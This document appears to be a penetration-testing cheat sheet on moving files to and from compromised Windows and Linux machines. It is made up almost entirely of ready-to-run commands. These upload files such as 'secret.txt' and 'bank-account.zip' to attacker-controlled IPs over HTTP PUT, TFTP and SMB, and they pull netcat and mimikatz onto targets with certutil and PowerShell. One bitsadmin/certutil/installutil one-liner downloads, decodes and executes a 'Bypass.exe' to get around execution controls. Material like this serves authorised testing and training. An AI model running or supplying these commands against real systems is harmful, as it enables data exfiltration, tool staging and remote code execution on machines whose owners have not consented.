---
layout: page
title: "Exfiltrate and Upload Data"
permalink: /exfiltrate_upload_data/
---

## Uploading data from a remote machine

### HTTP Upload / PUT server:

```powershell
#Download the HTTP PUT Server:
https://gist.github.com/fabiand/5628006

#Alternative
https://gist.github.com/codification/1393204
#Only For This Alternative - Change "server_address = ('localhost', port)" in the script to the actual listening IP like "server_address = ('10.10.14.2', port)"

#Start the server
sudo python HTTPutServer.py 80

#Powershell Upload:
$body = Get-Content 20210725041909_bloodhoundcyberlocal.zip
Invoke-RestMethod -Uri http://10.10.14.2:8080/20210725041909_bloodhoundcyberlocal.zip -Method PUT -Body $body

#Curl:
curl --upload-file secret.txt http://ip:port/

#Wget:
wget --method=PUT --post-file=secret.txt http://ip:port
```

### EXE 2 HEX:

Convert a EXE to HEX and reassable it on a Windows machine from the CMD prompt:

```bash
upx -9 nc.exe

exe2hex -x nc.exe -p nc.cmd

#Run the CMD file or its commands on the Windows machine.
```

### Upload file to HTTP uploader with Powershell:

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```

### Upload file with TFTP:

```bash
#Create a TFTP server on Kali
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp

#Upload a file to it:
tftp -i 10.11.0.4 put important.docx
```

### Upload file with VSFTPD FTP:

```bash
sudo apt install vsftpd
sudo nano /etc/vsftpd.conf
sudo service vsftpd start
sudo service vsftpd status
```

### Copy-Paste Base64 encoded file:

```bash
python -c 'print(__import__("base64").b64encode(open("file", "rb").read()))'

#Paste string in a textfile and unpack content:
%STRING% > output.txt
base64 -d output.txt > output-file
```

### Upload by using SMB:

```bash
#Start server:
sudo python3 smbserver.py jshare /home/jarno/Desktop -smb2support

#Upload files
xcopy bank-account.zip \\192.168.119.191\jshare

#Download files
copy \\192.168.119.191\jshare\mimikatz.exe c:\mimikatz.exe
```

## Downloading data on a remote machine

### Powershell 4+:

```powershell
Invoke-WebRequest "http://10.10.14.14:9999/nc64.exe" -OutFile "C:\Temp\nc.exe"

#OR with shorttag:

IVW "http://10.10.14.14:9999/nc64.exe" -OutFile "C:\Temp\nc.exe"

```

### Powershell (any version)

```bash
(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
```

### CertUtil:

```powershell
certutil.exe -urlcache  -f  http://10.10.14.14:9999/nc64.exe C:\\Windows\Temp\nc64.exe
```

Instead of transferring files with CertUtil we can also encode files:

```powershell
#Encode:
certutil -encode C:\Users\jarno\deskto\Bypass.exe enc.txt

#Decode:
certutil -decode enc.txt Bypass.exe
```

### SCP:

```bash
roy = username
./ = local current dir
scp roy@10.10.10.100://var/www/bucket-app/files/result.pdf ./
```

### Covenant:

```bash
#Covenant
https://github.com/cobbr/Covenant
#+Elite
https://github.com/cobbr/Elite
```

### BitsAdmin:

```powershell
#Encode (CertUtil)
certutil -encode C:\Users\jarno\deskto\Bypass.exe enc.txt

#Transfer - BitsAdmin:
bitsadmin /Transfer myJob http://192.168.178.178/enc.txt C:\Users\jarno\Desktop\enc.txt

#Oneliner (from perspective on attacker machine - from download to execution):
bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile=/LogToConsole=false /U C:\users\student\Bypass.exe
```

## Other resources for exfiltration:

[https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65](https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65)
